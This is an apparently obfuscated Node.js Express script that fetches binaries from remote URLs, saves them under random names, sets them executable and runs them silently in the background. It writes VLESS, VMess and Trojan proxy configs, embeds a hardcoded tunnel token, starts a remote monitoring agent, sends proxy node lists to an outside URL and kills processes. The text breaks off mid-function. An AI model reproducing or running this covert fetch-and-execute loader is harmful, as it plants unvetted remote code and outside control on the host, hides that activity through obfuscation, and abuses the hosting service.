const _0x49410c=_0x390f;(function(_0x28be4f,_0x3b3177){const _0x2df759={_0x580f36:0x1c7,_0x778421:0x1e0,_0x4a0467:0x1bd,_0x1cd465:0x1ce,_0x1c93ad:0x1d1},_0x17e63f=_0x390f,_0x467b42=_0x28be4f();while(!![]){try{const _0x444a80=parseInt(_0x17e63f(0x1d7))/0x1*(-parseInt(_0x17e63f(0x1bc))/0x2)+parseInt(_0x17e63f(_0x2df759._0x580f36))/0x3*(parseInt(_0x17e63f(0x214))/0x4)+-parseInt(_0x17e63f(_0x2df759._0x778421))/0x5*(parseInt(_0x17e63f(0x1d9))/0x6)+-parseInt(_0x17e63f(0x1de))/0x7+-parseInt(_0x17e63f(_0x2df759._0x4a0467))/0x8*(parseInt(_0x17e63f(0x1e6))/0x9)+parseInt(_0x17e63f(_0x2df759._0x1cd465))/0xa*(-parseInt(_0x17e63f(_0x2df759._0x1c93ad))/0xb)+parseInt(_0x17e63f(0x184))/0xc;if(_0x444a80===_0x3b3177)break;else _0x467b42['push'](_0x467b42['shift']());}catch(_0x287db0){_0x467b42['push'](_0x467b42['shift']());}}}(_0x1eab,0xb7d02));const express=require('express'),app=express(),axios=require(_0x49410c(0x220)),os=require('os'),fs=require('fs'),path=require(_0x49410c(0x1e1)),{promisify}=require('util'),exec=promisify(require(_0x49410c(0x210))[_0x49410c(0x22a)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x49410c(0x235)][_0x49410c(0x219)]||'',PROJECT_URL=process['env'][_0x49410c(0x1da)]||'',AUTO_ACCESS=process[_0x49410c(0x235)][_0x49410c(0x1dd)]||![],FILE_PATH=process[_0x49410c(0x235)][_0x49410c(0x17a)]||_0x49410c(0x192),SUB_PATH=process[_0x49410c(0x235)][_0x49410c(0x1b0)]||_0x49410c(0x240),PORT=process['env']['SERVER_PORT']||process[_0x49410c(0x235)][_0x49410c(0x231)]||0xbb8,UUID=process[_0x49410c(0x235)][_0x49410c(0x1d2)]||_0x49410c(0x221),NEZHA_SERVER=process[_0x49410c(0x235)][_0x49410c(0x23b)]||'',NEZHA_PORT=process[_0x49410c(0x235)][_0x49410c(0x1d3)]||'',NEZHA_KEY=process[_0x49410c(0x235)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x49410c(0x235)]['ARGO_DOMAIN']||_0x49410c(0x1ee),ARGO_AUTH=process[_0x49410c(0x235)][_0x49410c(0x203)]||'eyJhIjoiNTJiN2I1MmZkYTIyODk0MWY1YWFjYzgzMjI3ZDU2OWMiLCJ0IjoiNGYwMmQxOGQtZmEzMS00MDE1LWEzYWItNGM1NzcxMGE2YzQ0IiwicyI6IllqZGlaRGN3TnpZdE5EWTFZeTAwTkRVd0xUaGpPVGd0T0RaaE1EQmxZakJoTUdWayJ9',ARGO_PORT=process[_0x49410c(0x235)][_0x49410c(0x1fd)]||0x1f41,CFIP=process[_0x49410c(0x235)][_0x49410c(0x198)]||_0x49410c(0x1c2),CFPORT=process[_0x49410c(0x235)]['CFPORT']||0x1bb,NAME=process['env'][_0x49410c(0x204)]||'';!fs[_0x49410c(0x228)](FILE_PATH)?(fs[_0x49410c(0x1c1)](FILE_PATH),console[_0x49410c(0x1f4)](FILE_PATH+_0x49410c(0x1fc))):console[_0x49410c(0x1f4)](FILE_PATH+_0x49410c(0x1d8));function generateRandomName(){const _0x294e4f=_0x49410c,_0x31c185=_0x294e4f(0x1bb);let _0x45bbec='';for(let _0x30af72=0x0;_0x30af72<0x6;_0x30af72++){_0x45bbec+=_0x31c185[_0x294e4f(0x1ea)](Math[_0x294e4f(0x23c)](Math[_0x294e4f(0x1b9)]()*_0x31c185[_0x294e4f(0x21b)]));}return _0x45bbec;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x49410c(0x211)](FILE_PATH,_0x49410c(0x200)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x49410c(0x211)](FILE_PATH,_0x49410c(0x22f)),configPath=path[_0x49410c(0x211)](FILE_PATH,_0x49410c(0x229));function deleteNodes(){const _0x43f59a={_0x42036e:0x228,_0xae56cf:0x1be,_0x448323:0x1ec,_0x24f6b3:0x1d4},_0x254347=_0x49410c;try{if(!UPLOAD_URL)return;if(!fs[_0x254347(_0x43f59a._0x42036e)](subPath))return;let _0x548cd8;try{_0x548cd8=fs[_0x254347(0x1cc)](subPath,_0x254347(0x1d4));}catch{return null;}const _0x1474cc=Buffer[_0x254347(_0x43f59a._0xae56cf)](_0x548cd8,_0x254347(_0x43f59a._0x448323))['toString'](_0x254347(_0x43f59a._0x24f6b3)),_0x4edf37=_0x1474cc[_0x254347(0x183)]('\x0a')['filter'](_0x4f243a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x254347(0x17e)](_0x4f243a));if(_0x4edf37[_0x254347(0x21b)]===0x0)return;return axios[_0x254347(0x22c)](UPLOAD_URL+_0x254347(0x222),JSON[_0x254347(0x1cd)]({'nodes':_0x4edf37}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x1fe09a=>{return null;}),null;}catch(_0x3e18a3){return null;}}function cleanupOldFiles(){const _0x155d69={_0x35a7ea:0x1d0},_0x5a98c4={_0x3370a9:0x20b},_0x1fb693=_0x49410c;try{const _0x3b00a4=fs[_0x1fb693(_0x155d69._0x35a7ea)](FILE_PATH);_0x3b00a4[_0x1fb693(0x182)](_0x218ab1=>{const _0x45e277=_0x1fb693,_0xd8f170=path[_0x45e277(0x211)](FILE_PATH,_0x218ab1);try{const _0x4f69a2=fs[_0x45e277(_0x5a98c4._0x3370a9)](_0xd8f170);_0x4f69a2[_0x45e277(0x1b3)]()&&fs[_0x45e277(0x1a1)](_0xd8f170);}catch(_0x1553cb){}});}catch(_0x4b0c54){}}app[_0x49410c(0x187)]('/',function(_0x1ddea4,_0x1d9bb8){const _0x55c6ba={_0x17c22d:0x1b1},_0x2d848c=_0x49410c;_0x1d9bb8[_0x2d848c(_0x55c6ba._0x17c22d)](_0x2d848c(0x208));});async function generateConfig(){const _0x436f74={_0xe83a0a:0x227,_0x103669:0x22d,_0x28ca92:0x18e,_0x5c57af:0x17d,_0x488b58:0x217,_0xbba342:0x23d,_0x2e6f20:0x1b8,_0x3fc7d5:0x1ca,_0x365bd8:0x19e,_0x24efc3:0x217,_0x4030fd:0x20a,_0x18ca20:0x19d,_0x196365:0x20c},_0x6d821e=_0x49410c,_0x5d7c84={'log':{'access':_0x6d821e(0x227),'error':_0x6d821e(_0x436f74._0xe83a0a),'loglevel':_0x6d821e(0x18e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x6d821e(0x23d),'settings':{'clients':[{'id':UUID,'flow':_0x6d821e(_0x436f74._0x103669)}],'decryption':_0x6d821e(_0x436f74._0x28ca92),'fallbacks':[{'dest':0xbb9},{'path':_0x6d821e(0x239),'dest':0xbba},{'path':_0x6d821e(0x1ca),'dest':0xbbb},{'path':_0x6d821e(_0x436f74._0x5c57af),'dest':0xbbc}]},'streamSettings':{'network':_0x6d821e(0x1a6)}},{'port':0xbb9,'listen':_0x6d821e(_0x436f74._0x488b58),'protocol':_0x6d821e(_0x436f74._0xbba342),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x6d821e(0x1a6),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x6d821e(0x23d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x6d821e(_0x436f74._0x28ca92)},'streamSettings':{'network':'ws','security':_0x6d821e(_0x436f74._0x28ca92),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x6d821e(_0x436f74._0x2e6f20),_0x6d821e(0x230),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x6d821e(_0x436f74._0x488b58),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x6d821e(_0x436f74._0x3fc7d5)}},'sniffing':{'enabled':!![],'destOverride':[_0x6d821e(0x1b8),_0x6d821e(0x230),_0x6d821e(_0x436f74._0x365bd8)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x6d821e(_0x436f74._0x24efc3),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x6d821e(_0x436f74._0x28ca92),'wsSettings':{'path':_0x6d821e(0x17d)}},'sniffing':{'enabled':!![],'destOverride':[_0x6d821e(0x1b8),'tls',_0x6d821e(_0x436f74._0x365bd8)],'metadataOnly':![]}}],'dns':{'servers':[_0x6d821e(0x1e3)]},'outbounds':[{'protocol':_0x6d821e(0x194),'tag':_0x6d821e(_0x436f74._0x4030fd)},{'protocol':_0x6d821e(0x215),'tag':_0x6d821e(_0x436f74._0x18ca20)}]};fs[_0x6d821e(_0x436f74._0x196365)](path['join'](FILE_PATH,_0x6d821e(0x229)),JSON[_0x6d821e(0x1cd)](_0x5d7c84,null,0x2));}function getSystemArchitecture(){const _0x49d885={_0x8cc76f:0x21c,_0xc72a31:0x241,_0x5acbbb:0x1c4},_0x2203dd=_0x49410c,_0x2a479b=os[_0x2203dd(_0x49d885._0x8cc76f)]();return _0x2a479b===_0x2203dd(_0x49d885._0xc72a31)||_0x2a479b===_0x2203dd(0x209)||_0x2a479b===_0x2203dd(0x232)?_0x2203dd(0x241):_0x2203dd(_0x49d885._0x5acbbb);}function downloadFile(_0x2ef12a,_0x401ec5,_0x5967c9){const _0x427572={_0x3e1165:0x1ac,_0x334ac4:0x1ae,_0xf367ad:0x1e4},_0x5f301d={_0x4f6eaa:0x1d6},_0x4d5c54=_0x49410c,_0x23eeb6=_0x2ef12a;!fs[_0x4d5c54(0x228)](FILE_PATH)&&fs[_0x4d5c54(0x1c1)](FILE_PATH,{'recursive':!![]});const _0x19822c=fs[_0x4d5c54(_0x427572._0x3e1165)](_0x23eeb6);axios({'method':_0x4d5c54(0x187),'url':_0x401ec5,'responseType':_0x4d5c54(_0x427572._0x334ac4)})['then'](_0x33c209=>{const _0x7ab5d4={_0x56cff3:0x180},_0x49575d={_0x697aca:0x1f4,_0x3d0af6:0x1c6},_0x15f867=_0x4d5c54;_0x33c209[_0x15f867(0x197)]['pipe'](_0x19822c),_0x19822c['on'](_0x15f867(0x195),()=>{const _0x1e0e6c=_0x15f867;_0x19822c[_0x1e0e6c(0x1f1)](),console[_0x1e0e6c(_0x49575d._0x697aca)](_0x1e0e6c(0x180)+path[_0x1e0e6c(0x1d6)](_0x23eeb6)+_0x1e0e6c(_0x49575d._0x3d0af6)),_0x5967c9(null,_0x23eeb6);}),_0x19822c['on']('error',_0x289b1e=>{const _0x53bac6=_0x15f867;fs['unlink'](_0x23eeb6,()=>{});const _0x8c0f7e=_0x53bac6(_0x7ab5d4._0x56cff3)+path['basename'](_0x23eeb6)+'\x20failed:\x20'+_0x289b1e[_0x53bac6(0x17f)];console['error'](_0x8c0f7e),_0x5967c9(_0x8c0f7e);});})[_0x4d5c54(_0x427572._0xf367ad)](_0x5d2829=>{const _0xafcbc2=_0x4d5c54,_0x32b3a1='Download\x20'+path[_0xafcbc2(_0x5f301d._0x4f6eaa)](_0x23eeb6)+_0xafcbc2(0x22b)+_0x5d2829['message'];console['error'](_0x32b3a1),_0x5967c9(_0x32b3a1);});}async function downloadFilesAndRun(){const _0x16f9a9={_0x36784b:0x21b,_0x227adf:0x1f4,_0x3f1530:0x1ad,_0x40611a:0x1f3,_0xa27863:0x17c,_0x488b78:0x20e,_0x540e2a:0x1ff,_0x4e401d:0x1f7,_0x297e59:0x1b6,_0x4b35e1:0x225,_0x213379:0x212,_0x47b6c7:0x216,_0x100f73:0x1eb,_0x463881:0x1f7,_0xc4a9ae:0x21e,_0xcb9ed7:0x234,_0x301db5:0x191,_0x1cbb34:0x18a,_0x5f1055:0x1b4,_0x1499f7:0x21a,_0x427d22:0x226,_0x3eba76:0x1db,_0x4f28c5:0x17c,_0x379a18:0x23e,_0x3f9940:0x1a4,_0x21b83f:0x22e,_0x518b0f:0x1a8,_0x52788d:0x1f4,_0x4bbb6e:0x1a5},_0x4306ff={_0x3bf590:0x182},_0x5b5858=_0x49410c,_0x44f87a=getSystemArchitecture(),_0x4b288f=getFilesForArchitecture(_0x44f87a);if(_0x4b288f[_0x5b5858(_0x16f9a9._0x36784b)]===0x0){console[_0x5b5858(_0x16f9a9._0x227adf)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5352c8=_0x4b288f[_0x5b5858(_0x16f9a9._0x3f1530)](_0x5ef0ca=>{return new Promise((_0x3016b5,_0x1082f2)=>{const _0x26add3=_0x390f;downloadFile(_0x5ef0ca['fileName'],_0x5ef0ca[_0x26add3(0x205)],(_0x2dcdfa,_0x103c4f)=>{_0x2dcdfa?_0x1082f2(_0x2dcdfa):_0x3016b5(_0x103c4f);});});});try{await Promise[_0x5b5858(_0x16f9a9._0x40611a)](_0x5352c8);}catch(_0x569825){console[_0x5b5858(_0x16f9a9._0xa27863)]('Error\x20downloading\x20files:',_0x569825);return;}function _0x46a900(_0x2686fd){const _0x22ffd8={_0x1bfe7e:0x228,_0x14c87e:0x20f},_0x30fdd1=_0x5b5858,_0x56bc8c=0x1fd;_0x2686fd[_0x30fdd1(_0x4306ff._0x3bf590)](_0x106518=>{const _0x1ac670={_0x56f2eb:0x233},_0x457504=_0x30fdd1;fs[_0x457504(_0x22ffd8._0x1bfe7e)](_0x106518)&&fs[_0x457504(_0x22ffd8._0x14c87e)](_0x106518,_0x56bc8c,_0x42129f=>{const _0x2d0457=_0x457504;_0x42129f?console[_0x2d0457(0x17c)](_0x2d0457(0x21f)+_0x106518+':\x20'+_0x42129f):console['log']('Empowerment\x20success\x20for\x20'+_0x106518+':\x20'+_0x56bc8c[_0x2d0457(_0x1ac670._0x56f2eb)](0x8));});});}const _0x131eea=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x46a900(_0x131eea);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x36c8a3=NEZHA_SERVER[_0x5b5858(0x191)](':')?NEZHA_SERVER['split'](':')[_0x5b5858(_0x16f9a9._0x488b78)]():'',_0x1447df=new Set(['443',_0x5b5858(_0x16f9a9._0x540e2a),_0x5b5858(_0x16f9a9._0x4e401d),_0x5b5858(_0x16f9a9._0x297e59),'2083','2053']),_0x54342e=_0x1447df[_0x5b5858(_0x16f9a9._0x4b35e1)](_0x36c8a3)?_0x5b5858(0x196):_0x5b5858(_0x16f9a9._0x213379),_0x46a745=_0x5b5858(0x181)+NEZHA_KEY+_0x5b5858(0x1ba)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x54342e+_0x5b5858(_0x16f9a9._0x47b6c7)+UUID;fs['writeFileSync'](path[_0x5b5858(0x211)](FILE_PATH,_0x5b5858(0x1aa)),_0x46a745);const _0x2e7651=_0x5b5858(0x1b4)+phpPath+_0x5b5858(0x1fb)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2e7651),console[_0x5b5858(0x1f4)](phpName+_0x5b5858(_0x16f9a9._0x100f73)),await new Promise(_0x8d89fa=>setTimeout(_0x8d89fa,0x3e8));}catch(_0x3160a1){console[_0x5b5858(_0x16f9a9._0xa27863)]('php\x20running\x20error:\x20'+_0x3160a1);}}else{let _0x416789='';const _0x1fcd09=[_0x5b5858(0x190),_0x5b5858(_0x16f9a9._0x540e2a),_0x5b5858(_0x16f9a9._0x463881),_0x5b5858(0x1b6),_0x5b5858(_0x16f9a9._0xc4a9ae),_0x5b5858(_0x16f9a9._0xcb9ed7)];_0x1fcd09[_0x5b5858(_0x16f9a9._0x301db5)](NEZHA_PORT)&&(_0x416789=_0x5b5858(_0x16f9a9._0x1cbb34));const _0x514f9d=_0x5b5858(_0x16f9a9._0x5f1055)+npmPath+_0x5b5858(_0x16f9a9._0x1499f7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5b5858(0x1c3)+NEZHA_KEY+'\x20'+_0x416789+_0x5b5858(_0x16f9a9._0x427d22);try{await exec(_0x514f9d),console[_0x5b5858(0x1f4)](npmName+_0x5b5858(0x1eb)),await new Promise(_0x3ffe1b=>setTimeout(_0x3ffe1b,0x3e8));}catch(_0x267edb){console['error']('npm\x20running\x20error:\x20'+_0x267edb);}}}else console[_0x5b5858(0x1f4)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x1c8a0e=_0x5b5858(0x1b4)+webPath+_0x5b5858(_0x16f9a9._0x3eba76)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1c8a0e),console[_0x5b5858(_0x16f9a9._0x227adf)](webName+_0x5b5858(0x1eb)),await new Promise(_0x5255c5=>setTimeout(_0x5255c5,0x3e8));}catch(_0x4c09bf){console[_0x5b5858(_0x16f9a9._0x4f28c5)](_0x5b5858(_0x16f9a9._0x379a18)+_0x4c09bf);}if(fs[_0x5b5858(0x228)](botPath)){let _0x2214dc;if(ARGO_AUTH[_0x5b5858(0x22e)](/^[A-Z0-9a-z=]{120,250}$/))_0x2214dc=_0x5b5858(_0x16f9a9._0x3f9940)+ARGO_AUTH;else ARGO_AUTH[_0x5b5858(_0x16f9a9._0x21b83f)](/TunnelSecret/)?_0x2214dc=_0x5b5858(_0x16f9a9._0x518b0f)+FILE_PATH+_0x5b5858(0x188):_0x2214dc=_0x5b5858(0x1b7)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5b5858(_0x16f9a9._0x5f1055)+botPath+'\x20'+_0x2214dc+_0x5b5858(0x238)),console[_0x5b5858(_0x16f9a9._0x52788d)](botName+_0x5b5858(0x1eb)),await new Promise(_0x13df23=>setTimeout(_0x13df23,0x7d0));}catch(_0x389f14){console[_0x5b5858(0x17c)](_0x5b5858(_0x16f9a9._0x4bbb6e)+_0x389f14);}}await new Promise(_0x4b593e=>setTimeout(_0x4b593e,0x1388));}function getFilesForArchitecture(_0x1cf264){const _0x59cd42={_0x2a9f88:0x241,_0x590da6:0x1c0,_0x2d5939:0x199,_0x4b0973:0x241,_0x57a108:0x201,_0x57a52f:0x241},_0x3344da=_0x49410c;let _0x3ec300;_0x1cf264===_0x3344da(_0x59cd42._0x2a9f88)?_0x3ec300=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3344da(_0x59cd42._0x590da6)}]:_0x3ec300=[{'fileName':webPath,'fileUrl':_0x3344da(_0x59cd42._0x2d5939)},{'fileName':botPath,'fileUrl':_0x3344da(0x1a9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2a554a=_0x1cf264===_0x3344da(_0x59cd42._0x4b0973)?_0x3344da(0x1dc):_0x3344da(0x1bf);_0x3ec300[_0x3344da(_0x59cd42._0x57a108)]({'fileName':npmPath,'fileUrl':_0x2a554a});}else{const _0x937f68=_0x1cf264===_0x3344da(_0x59cd42._0x57a52f)?'https://arm64.ssss.nyc.mn/v1':_0x3344da(0x1b5);_0x3ec300[_0x3344da(_0x59cd42._0x57a108)]({'fileName':phpPath,'fileUrl':_0x937f68});}}return _0x3ec300;}function argoType(){const _0x3c461c={_0x225142:0x18b,_0x5baa6a:0x1ed,_0x5789a3:0x20c},_0x130f6d=_0x49410c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x130f6d(0x1f4)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x130f6d(0x191)]('TunnelSecret')){fs[_0x130f6d(0x20c)](path[_0x130f6d(0x211)](FILE_PATH,_0x130f6d(_0x3c461c._0x225142)),ARGO_AUTH);const _0x4c69d3=_0x130f6d(0x213)+ARGO_AUTH[_0x130f6d(0x183)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x130f6d(0x211)](FILE_PATH,_0x130f6d(0x18b))+_0x130f6d(0x20d)+ARGO_DOMAIN+_0x130f6d(0x223)+ARGO_PORT+_0x130f6d(_0x3c461c._0x5baa6a);fs[_0x130f6d(_0x3c461c._0x5789a3)](path[_0x130f6d(0x211)](FILE_PATH,_0x130f6d(0x1a0)),_0x4c69d3);}else console[_0x130f6d(0x1f4)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x90bd3c={_0x4dc505:0x1cc,_0x29c8e3:0x211,_0x56d7d3:0x1d4,_0x21efd0:0x183,_0x512571:0x238,_0x20be27:0x17c,_0x545ac1:0x19c},_0x5b1ca7={_0x1776e1:0x193,_0x2c3c39:0x1af,_0x52ff2b:0x197,_0xc2b278:0x187,_0xc97a1a:0x1f6,_0x54dd19:0x197,_0x22094f:0x1af,_0x2e1eec:0x197,_0x3e2eb4:0x197},_0x529589={_0x4faffd:0x1e9,_0x416f8c:0x1f2,_0x341039:0x1c5,_0x3b5c54:0x207,_0x5ba640:0x19b,_0x3eb811:0x1ea},_0x3df010=_0x49410c;let _0x1c84f0;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c84f0=ARGO_DOMAIN,console['log'](_0x3df010(0x17b),_0x1c84f0),await _0x54f7d1(_0x1c84f0);else try{const _0x5d61a6=fs[_0x3df010(_0x90bd3c._0x4dc505)](path[_0x3df010(_0x90bd3c._0x29c8e3)](FILE_PATH,_0x3df010(0x22f)),_0x3df010(_0x90bd3c._0x56d7d3)),_0x340431=_0x5d61a6[_0x3df010(_0x90bd3c._0x21efd0)]('\x0a'),_0x330684=[];_0x340431['forEach'](_0x40a03b=>{const _0x5ee8d9=_0x3df010,_0x1f2d1c=_0x40a03b['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1f2d1c){const _0x530fde=_0x1f2d1c[0x1];_0x330684[_0x5ee8d9(0x206)](_0x530fde);}});if(_0x330684['length']>0x0)_0x1c84f0=_0x330684[0x0],console['log']('ArgoDomain:',_0x1c84f0),await _0x54f7d1(_0x1c84f0);else{console[_0x3df010(0x1f4)](_0x3df010(0x1a2)),fs['unlinkSync'](path[_0x3df010(0x211)](FILE_PATH,'boot.log'));async function _0x261ff5(){const _0x2a06a3=_0x3df010;try{process[_0x2a06a3(_0x529589._0x4faffd)]===_0x2a06a3(_0x529589._0x416f8c)?await exec(_0x2a06a3(_0x529589._0x341039)+botName+_0x2a06a3(_0x529589._0x3b5c54)):await exec(_0x2a06a3(_0x529589._0x5ba640)+botName[_0x2a06a3(_0x529589._0x3eb811)](0x0)+']'+botName[_0x2a06a3(0x1f8)](0x1)+_0x2a06a3(0x1c9));}catch(_0x579494){}}_0x261ff5(),await new Promise(_0x3c715b=>setTimeout(_0x3c715b,0xbb8));const _0x38f6b1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3df010(0x237)+ARGO_PORT;try{await exec(_0x3df010(0x1b4)+botPath+'\x20'+_0x38f6b1+_0x3df010(_0x90bd3c._0x512571)),console[_0x3df010(0x1f4)](botName+_0x3df010(0x1eb)),await new Promise(_0x1029e=>setTimeout(_0x1029e,0xbb8)),await extractDomains();}catch(_0x5da405){console[_0x3df010(_0x90bd3c._0x20be27)]('Error\x20executing\x20command:\x20'+_0x5da405);}}}catch(_0x5de34f){console[_0x3df010(_0x90bd3c._0x20be27)](_0x3df010(_0x90bd3c._0x545ac1),_0x5de34f);}async function _0x2b719f(){const _0x49d69f=_0x3df010;try{const _0x4f433f=await axios[_0x49d69f(0x187)](_0x49d69f(0x1ef),{'timeout':0xbb8});if(_0x4f433f[_0x49d69f(0x197)]&&_0x4f433f[_0x49d69f(0x197)][_0x49d69f(_0x5b1ca7._0x1776e1)]&&_0x4f433f[_0x49d69f(0x197)][_0x49d69f(_0x5b1ca7._0x2c3c39)])return _0x4f433f[_0x49d69f(_0x5b1ca7._0x52ff2b)][_0x49d69f(0x193)]+'_'+_0x4f433f[_0x49d69f(0x197)][_0x49d69f(0x1af)];}catch(_0x531e8a){try{const _0x4f90bf=await axios[_0x49d69f(_0x5b1ca7._0xc2b278)](_0x49d69f(_0x5b1ca7._0xc97a1a),{'timeout':0xbb8});if(_0x4f90bf[_0x49d69f(0x197)]&&_0x4f90bf[_0x49d69f(_0x5b1ca7._0x54dd19)]['status']==='success'&&_0x4f90bf[_0x49d69f(0x197)][_0x49d69f(0x19f)]&&_0x4f90bf['data'][_0x49d69f(_0x5b1ca7._0x22094f)])return _0x4f90bf[_0x49d69f(_0x5b1ca7._0x2e1eec)][_0x49d69f(0x19f)]+'_'+_0x4f90bf[_0x49d69f(_0x5b1ca7._0x3e2eb4)][_0x49d69f(0x1af)];}catch(_0x58c726){}}return'Unknown';}async function _0x54f7d1(_0x243888){const _0x1817db=await _0x2b719f(),_0x437fdb=NAME?NAME+'-'+_0x1817db:_0x1817db;return new Promise(_0x6ed7ef=>{const _0x7be884={_0x2e1d2a:0x230,_0x2441e5:0x1e2,_0x2f8643:0x1f4,_0x166a4c:0x1ec,_0x5c2e09:0x202};setTimeout(()=>{const _0x273085={_0x2e4b39:0x1be,_0x2601fa:0x23f},_0x2bf488=_0x390f,_0x5296f2={'v':'2','ps':''+_0x437fdb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x243888,'path':_0x2bf488(0x1e8),'tls':_0x2bf488(_0x7be884._0x2e1d2a),'sni':_0x243888,'alpn':'','fp':_0x2bf488(0x1a7)},_0x31f32d=_0x2bf488(0x1b2)+UUID+'@'+CFIP+':'+CFPORT+_0x2bf488(0x1cb)+_0x243888+_0x2bf488(0x21d)+_0x243888+_0x2bf488(0x23a)+_0x437fdb+'\x0a\x0avmess://'+Buffer[_0x2bf488(0x1be)](JSON[_0x2bf488(0x1cd)](_0x5296f2))[_0x2bf488(0x233)](_0x2bf488(0x1ec))+_0x2bf488(0x1f9)+UUID+'@'+CFIP+':'+CFPORT+_0x2bf488(0x1e5)+_0x243888+'&fp=firefox&type=ws&host='+_0x243888+_0x2bf488(_0x7be884._0x2441e5)+_0x437fdb+'\x0a\x20\x20\x20\x20';console[_0x2bf488(_0x7be884._0x2f8643)](Buffer['from'](_0x31f32d)['toString'](_0x2bf488(0x1ec))),fs[_0x2bf488(0x20c)](subPath,Buffer[_0x2bf488(0x1be)](_0x31f32d)[_0x2bf488(0x233)](_0x2bf488(_0x7be884._0x166a4c))),console[_0x2bf488(0x1f4)](FILE_PATH+_0x2bf488(_0x7be884._0x5c2e09)),uploadNodes(),app[_0x2bf488(0x187)]('/'+SUB_PATH,(_0x54b50e,_0x245fcb)=>{const _0x2943ac=_0x2bf488,_0x56cc51=Buffer[_0x2943ac(_0x273085._0x2e4b39)](_0x31f32d)['toString']('base64');_0x245fcb[_0x2943ac(_0x273085._0x2601fa)](_0x2943ac(0x1df),_0x2943ac(0x1a3)),_0x245fcb[_0x2943ac(0x1b1)](_0x56cc51);}),_0x6ed7ef(_0x31f32d);},0x7d0);});}}async function uploadNodes(){const _0x303d58={_0x3b836a:0x22c,_0x5bebf5:0x185,_0x434504:0x1fa,_0x3ab129:0x18c,_0x3738a0:0x228,_0x4b7ef0:0x1cc,_0x8255f8:0x18d,_0x51afdc:0x21b,_0x495caf:0x1f4,_0x441e7c:0x1ab},_0x58afc9=_0x49410c;if(UPLOAD_URL&&PROJECT_URL){const _0x207ffa=PROJECT_URL+'/'+SUB_PATH,_0x55e962={'subscription':[_0x207ffa]};try{const _0xb5ad94=await axios[_0x58afc9(_0x303d58._0x3b836a)](UPLOAD_URL+_0x58afc9(_0x303d58._0x5bebf5),_0x55e962,{'headers':{'Content-Type':'application/json'}});return _0xb5ad94&&_0xb5ad94[_0x58afc9(0x18c)]===0xc8?(console['log'](_0x58afc9(_0x303d58._0x434504)),_0xb5ad94):null;}catch(_0x3729d5){if(_0x3729d5['response']){if(_0x3729d5['response'][_0x58afc9(_0x303d58._0x3ab129)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x58afc9(_0x303d58._0x3738a0)](listPath))return;const _0xb139ef=fs[_0x58afc9(_0x303d58._0x4b7ef0)](listPath,_0x58afc9(0x1d4)),_0x18d57b=_0xb139ef[_0x58afc9(0x183)]('\x0a')[_0x58afc9(_0x303d58._0x8255f8)](_0x2cbd0c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2cbd0c));if(_0x18d57b[_0x58afc9(_0x303d58._0x51afdc)]===0x0)return;const _0x39cf1a=JSON[_0x58afc9(0x1cd)]({'nodes':_0x18d57b});try{const _0x19dc83=await axios[_0x58afc9(0x22c)](UPLOAD_URL+_0x58afc9(0x218),_0x39cf1a,{'headers':{'Content-Type':_0x58afc9(0x236)}});return _0x19dc83&&_0x19dc83[_0x58afc9(_0x303d58._0x3ab129)]===0xc8?(console[_0x58afc9(_0x303d58._0x495caf)](_0x58afc9(_0x303d58._0x441e7c)),_0x19dc83):null;}catch(_0x370df9){return null;}}else return;}}function _0x1eab(){const 